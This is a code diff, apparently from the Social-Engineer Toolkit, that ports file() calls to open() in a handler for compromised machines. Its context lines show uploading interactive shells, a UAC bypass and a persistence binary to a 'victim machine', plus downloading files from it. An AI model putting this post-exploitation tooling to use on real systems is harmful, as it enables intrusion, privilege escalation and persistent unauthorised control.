@@ -755,7 +755,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                     download_path = download_path.replace("\\", "_")
                     download_path = download_path.replace("/", "_")
                     download_path = download_path.replace(":", "_")
-                    filewrite = file(download_path, "wb")
+                    filewrite = open(download_path, "wb")
 
                     # start a loop until we are finished getting data
 
@@ -831,7 +831,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                         upload = "shell.windows"
 
                     if os.path.isfile(upload):
-                        fileopen = file(upload, "rb")
+                        fileopen = open(upload, "rb")
 
                         print("[*] Attempting to upload interactive shell to victim machine.")
 
@@ -884,7 +884,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                     # normal outside routines
                     if os.path.isfile(setdir + "/uac.address"):
                         os.remove(setdir + "/uac.address")
-                    filewrite = file(setdir + "/uac.address", "w")
+                    filewrite = open(setdir + "/uac.address", "w")
                     filewrite.write(addr)
                     filewrite.close()
 
@@ -920,7 +920,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                             upload = "uac_bypass/x86.binary"
 
                     if os.path.isfile(upload):
-                        fileopen = file(upload, "rb")
+                        fileopen = open(upload, "rb")
 
                         print("[*] Attempting to upload UAC bypass to the victim machine.")
                         # start a loop
@@ -965,7 +965,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                         upload = "shell.windows"
 
                     if os.path.isfile(upload):
-                        fileopen = file(upload, "rb")
+                        fileopen = open(upload, "rb")
 
                         print("[*] Attempting to upload interactive shell to victim machine.")
 
@@ -1043,7 +1043,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                             upload = "persistence.binary"
 
                         if os.path.isfile(upload):
-                            fileopen = file(upload, "rb")
+                            fileopen = open(upload, "rb")
 
                             print("[*] Attempting to upload the SET Interactive Service to the victim.")
                             # start a loop
@@ -1095,7 +1095,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                             upload = "shell.windows"
 
                         if os.path.isfile(upload):
-                            fileopen = file(upload, "rb")
+                            fileopen = open(upload, "rb")
 
                             print("[*] Attempting to upload SET Interactive Shell to victim machine.")
 
@@ -1151,7 +1151,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                     data_file = ""
 
                     if os.path.isfile(upload):
-                        fileopen = file(upload, "rb")
+                        fileopen = open(upload, "rb")
 
                         print("[*] Attempting to upload %s to %s on victim machine." % (upload, write_path))
                         # start a loop
@@ -1438,7 +1438,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                 if data == "IHAYYYYYIAMSETANDIAMWINDOWS":
 
                     if os.path.isfile(setdir + "/system.address"):
-                        fileopen = file(setdir + "/system.address", "r")
+                        fileopen = open(setdir + "/system.address", "r")
                         system = fileopen.read().rstrip()
                         system = system.replace(":WINDOWS", "")
                         system = system.replace(":UAC-SAFE", "")
@@ -1447,7 +1447,7 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                             bypass_counter = 1
 
                     if os.path.isfile(setdir + "/uac.address"):
-                        fileopen = file(setdir + "/uac.address", "r")
+                        fileopen = open(setdir + "/uac.address", "r")
                         uac = fileopen.read().rstrip()
                         uac = uac.replace(":WINDOWS", "")
                         if str(addr[0]) == str(uac):
